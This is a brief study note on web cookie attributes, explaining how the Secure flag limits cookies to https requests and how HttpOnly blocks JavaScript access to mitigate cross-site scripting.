Cookie parameters
Secure - Indicates that the cookie is sent to the server only when a request is made with the https: scheme/ resistant to MitM
HttpOnly - Forbids JavaScript from accessing the cookie; Note that a cookie that has been created with HttpOnly will still be
  sent with JavaScript-initiated requests, for example, when calling XMLHttpRequest.send() or fetch(). This mitigates attacks
  against cross-site scripting (XSS).
